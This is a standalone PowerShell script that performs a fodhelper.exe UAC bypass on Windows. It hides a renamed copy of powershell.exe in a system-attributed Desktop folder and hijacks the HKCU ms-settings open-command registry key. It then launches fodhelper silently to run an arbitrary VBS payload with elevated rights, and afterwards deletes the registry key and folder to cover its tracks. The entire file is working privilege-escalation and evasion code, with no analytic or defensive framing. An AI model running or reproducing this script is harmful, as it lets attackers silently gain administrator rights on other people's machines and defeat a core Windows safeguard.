# Get the Desktop path
try {
    $desktopPath = [System.Environment]::GetFolderPath('Desktop')
} catch {
    Write-Error "Failed to retrieve the Desktop path. Exiting script."
    exit
}

# Define the hidden folder path
$hiddenFolderPath = Join-Path -Path $desktopPath -ChildPath ".hiddenFolder"

# Ensure the hidden folder exists
try {
    if (-not (Test-Path $hiddenFolderPath)) {
        New-Item -Path $hiddenFolderPath -ItemType Directory -Force | Out-Null
        Write-Host "Hidden folder created at: $hiddenFolderPath"
    } else {
        Write-Host "Hidden folder already exists at: $hiddenFolderPath"
    }
    # Set folder attributes to hidden and system
    attrib +s +h $hiddenFolderPath
} catch {
    Write-Error "Failed to create or update attributes for the hidden folder. Exiting script."
    exit
}

# Generate a unique name for a copied PowerShell executable
$uniqueExeNamePowershell = [guid]::NewGuid().ToString()
$fullUniqueExePowershell = $uniqueExeNamePowershell + ".exe"
$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExePowershell

try {
    # Copy PowerShell.exe to the hidden folder with a unique name
    $sourcePowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    if (Test-Path $sourcePowershellPath) {
        Copy-Item -Path $sourcePowershellPath -Destination $destinationPathPowershell -Force
        Write-Host "PowerShell executable copied to: $destinationPathPowershell"
    } else {
        Write-Error "Source PowerShell executable not found at $sourcePowershellPath. Exiting script."
        exit
    }
} catch {
    Write-Error "Failed to copy PowerShell executable. Exiting script."
    exit
}

# Define the commands to execute with elevated privileges
$CommandsToExecute = @"
# Define your commands here
 C:\Windows\Script.vbs
"@

# Write the commands to a script file in the hidden folder
$scriptPath = Join-Path -Path $hiddenFolderPath -ChildPath "script.ps1"
try {
    $CommandsToExecute | Out-File -FilePath $scriptPath -Encoding UTF8
    Write-Host "Script file created at: $scriptPath"
} catch {
    Write-Error "Failed to create script file. Exiting script."
    exit
}

# Create a registry key for a custom command
$regKeyPath = "HKCU:\Software\Classes\ms-settings\Shell\open\command"

try {
    # Create the registry key and set required properties
    New-Item -Path $regKeyPath -Force | Out-Null
    New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    # Define the command to execute the script file
    $command = "$destinationPathPowershell -File `"$scriptPath`""
    Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
    Write-Host "Registry key created and command set to: $command"
} catch {
    Write-Error "Failed to configure the registry key. Exiting script."
    exit
}

# Trigger Fodhelper to execute the command
try {
    $fodhelperPath = "C:\Windows\System32\fodhelper.exe"
    if (Test-Path $fodhelperPath) {
        Start-Process -FilePath $fodhelperPath -WindowStyle Hidden
        Write-Host "Fodhelper.exe executed."
    } else {
        Write-Error "Fodhelper.exe not found. Exiting script."
        exit
    }
} catch {
    Write-Error "Failed to execute fodhelper.exe. Exiting script."
    exit
}

# Dynamic wait for the PowerShell process to complete
try {
    $isPowershellRunning = $true
    Write-Host "Waiting for the PowerShell process to complete..."
    while ($isPowershellRunning) {
        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
        if ($process -eq $null) {
            $isPowershellRunning = $false
            Write-Host "PowerShell process completed."
        }
        Start-Sleep -Seconds 3
    }
} catch {
    Write-Error "Error during dynamic wait. Exiting script."
    exit
}

# Clean up the registry key after execution
try {
    if (Test-Path $regKeyPath) {
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
        Write-Host "Registry key cleaned up."
    }
} catch {
    Write-Warning "Failed to clean up the registry key. Please remove it manually if necessary."
}

# Clean up the hidden folder and its contents
try {
    attrib -s -h $hiddenFolderPath
    if (Test-Path $hiddenFolderPath) {
        Remove-Item -Path $hiddenFolderPath -Recurse -Force
        Write-Host "Hidden folder and its contents have been cleaned up."
    } else {
        Write-Host "Hidden folder does not exist or has already been deleted."
    }
} catch {
    Write-Warning "Failed to clean up the hidden folder. Please remove it manually if necessary."
}

# Script completed successfully
Write-Host "Script completed. All operations executed."
exit
